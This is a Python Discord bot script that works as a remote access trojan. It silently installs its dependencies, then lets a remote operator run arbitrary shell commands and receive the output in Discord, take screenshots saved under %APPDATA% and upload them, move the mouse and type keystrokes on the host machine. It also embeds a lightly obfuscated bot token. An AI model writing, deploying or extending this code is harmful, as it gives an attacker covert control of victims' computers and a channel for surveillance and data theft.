# pip install discord.py pyautogui
import os
import sys
import subprocess
required_packages = ["discord.py", "pyautogui"]
for package in required_packages:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package, "--quiet"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"Failed to install {package}: {e}")
import discord
from discord.ext import commands
import pyautogui
# === CONFIG ===
TOKEN = "MTQxMjA1NjU2NzM0MzQ4MDkzMw(ket)GuauYR(ket)vPCRndJxzVrRwG1fHxkvYQjqU__nd-mshcP2s(zro)"  # <-- replace with your bot token

# Use %AppData% as save directory
save_dir = os.getenv("APPDATA")

# Set up bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# === EVENTS ===
@bot.event
async def on_ready():
    print(f"Bot connected: {bot.user}")

# === COMMANDS ===
@bot.command(name="cmd")
async def run_cmd(ctx, *, command):
    """Run a shell command and send output back to Discord"""
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if len(result) > 1900:
            for i in range(0, len(result), 1900):
                await ctx.send(f"```\n{result[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error:\n```\n{e.output}\n```")

@bot.command(name="screenshot")
async def screenshot(ctx):
    """Take a screenshot and send it to Discord"""
    path = os.path.join(save_dir, f"screenshot_{int(os.times().system)}.png")
    img = pyautogui.screenshot()
    img.save(path)
    await ctx.send(file=discord.File(path))

@bot.command(name="mouse")
async def move_mouse(ctx, x: int, y: int):
    """Move the mouse cursor to (x, y) coordinates"""
    try:
        pyautogui.moveTo(x, y)
        await ctx.send(f"Moved mouse to ({x}, {y})")
    except Exception as e:
        await ctx.send(f"Error moving mouse: {e}")

@bot.command(name="keyboard")
async def type_text(ctx, *, text: str):
    """Type the given text as keyboard input"""
    try:
        pyautogui.write(text)
        await ctx.send(f"Typed text: {text}")
    except Exception as e:
        await ctx.send(f"Error typing text: {e}")

# === RUN BOT ===
try:
    bot.run(TOKEN)
except Exception as e:
    print("Error starting bot:", e)
